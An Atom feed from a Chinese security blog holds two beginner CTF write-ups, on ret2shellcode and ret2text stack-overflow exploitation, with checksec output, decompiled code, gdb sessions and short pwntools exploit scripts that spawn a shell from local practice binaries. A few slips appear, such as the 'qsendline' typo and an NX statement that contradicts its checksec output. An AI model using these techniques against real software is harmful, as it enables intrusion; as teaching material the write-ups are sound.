<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2021-07-14T12:48:20.670Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchu的blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[shellcode 基础]]></title>
        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
        </link>
        <updated>2021-07-14T12:17:14.000Z</updated>
        <summary type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
]]></summary>
        <content type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
<!-- more -->
<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
<!-- more -->
<p>然后确定栈溢出覆盖返回地址的位置，可以手动计算，这里使用cyclic；<br>
cyclic pattern是一个很好用的功能，pattern就是指一个字符串。在完成溢出题目时，使用cyclic pattern可以大大减少计算溢出点的时间。<br>
<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
可以发现在0x62616164中溢出<br>
输入cyclic -l 0x0626164  可以得到偏移量为112<br>
因此我们可以构造payload<br>
payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
EXP如下</p>
<pre><code>from pwn import *

q = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[构造基本rop]]></title>
        <id>https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/</id>
        <link href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
        </link>
        <updated>2021-07-14T00:55:46.000Z</updated>
        <summary type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
        程序存在溢出，并且可以控制返回地址。
        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳<br>
题目ret2text<br>
ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
做题目前首先得查看一下程序的保护机制</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
        程序存在溢出，并且可以控制返回地址。
        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳<br>
题目ret2text<br>
ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
做题目前首先得查看一下程序的保护机制</p>
<!-- more -->
<p>Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)</p>
<!-- more -->
<p>很明显可以看出这是32位程序，只开了NX保护<br>
我们用ida32打开文件   按F5进入main函数</p>
<!-- more -->
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
{<br>
char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
<p>setvbuf(stdout, 0, 2, 0);<br>
setvbuf(_bss_start, 0, 1, 0);<br>
puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
gets(s);<br>
printf(&quot;Maybe I will tell you next time !&quot;);<br>
return 0;<br>
}</p>
<!-- more -->
<p>发现gets（）函数，gets是不限制输入内容，仅收到回车后结束 //gets，直接读取一行，忽略'\x00'<br>
再查看其他函数发现/bin/sh          //经典后面函数直接进入系统</p>
<!-- more -->
<p>void secure()<br>
{<br>
unsigned int v0; // eax<br>
int input; // [esp+18h] [ebp-10h] BYREF<br>
int secretcode; // [esp+1Ch] [ebp-Ch]</p>
<p>v0 = time(0);<br>
srand(v0);<br>
secretcode = rand();<br>
__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
if ( input == secretcode )<br>
system(&quot;/bin/sh&quot;);<br>
}</p>
<!-- more -->
<p>再ida找到/bin/sh的地址</p>
<!-- more -->
<p>.text:080485FD                 push    ebp<br>
.text:080485FE                 mov     ebp, esp<br>
.text:08048600                 sub     esp, 28h<br>
.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
.text:0804860A                 call    _time<br>
.text:0804860F                 mov     [esp], eax      ; seed<br>
.text:08048612                 call    _srand<br>
.text:08048617                 call    _rand<br>
.text:0804861C                 mov     [ebp+secretcode], eax<br>
.text:0804861F                 lea     eax, [ebp+input]<br>
.text:08048622                 mov     [esp+4], eax<br>
.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
.text:0804862D                 call    ___isoc99_scanf<br>
.text:08048632                 mov     eax, [ebp+input]<br>
.text:08048635                 cmp     eax, [ebp+secretcode]<br>
.text:08048638                 jnz     short locret_8048646<br>
.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
.text:08048641                 call    _system</p>
<!-- more -->
<p>发现/bin/sh地址在0x0804863A,这是bin_str=0x0804863A，那么如果我们直接控制程序返回至 0x0804863A<br>
下面就是我们如何构造 payload 了，从gets开始寻找</p>
<!-- more -->
<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
.text:080486AB                 mov     [esp], eax      ; s<br>
.text:080486AE                 call    _gets</p>
<!-- more -->
<p>利用gdb来打断点</p>
<!-- more -->
<p>pwndbg&gt; b *0x080486AE<br>
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
pwndbg&gt; r<br>
Starting program: /home/nianchu/Desktop/新手训练/ret2text<br>
There is something amazing here, do you know anything?</p>
<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
24	ret2text.c: 没有那个文件或目录.<br>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
─────────────────────────────────[ REGISTERS ]──────────────────────────────────<br>
EAX  0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
EBX  0x0<br>
ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) ◂— 0xfb88900a<br>
EDX  0xf7fb8890 (_IO_stdfile_1_lock) ◂— 0x0<br>
EDI  0x0<br>
ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x1d7d8c<br>
EBP  0xffffcf68 ◂— 0x0<br>
ESP  0xffffcee0 —▸ 0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</p>
<!-- more -->
<p>从ESP可以发现在esp为0xffffcee0，ebp为0xffffcf68,s为0xffffcefc<br>
·········s 相对于 ebp 的偏移为 0x6c<br>
·········s 相对于返回地址的偏移为 0x6c+4<br>
最后payload构造如下：</p>
<!-- more -->
<p>from pwn import*</p>
<p>q=process('./ret2text')<br>
bin_str=0x0804863A<br>
payload='a'*(0x6c+4)+p32(bin_str)<br>
q.sendline(payload)<br>
q.interactive()</p>
<!-- more -->
]]></content>
    </entry>
</feed>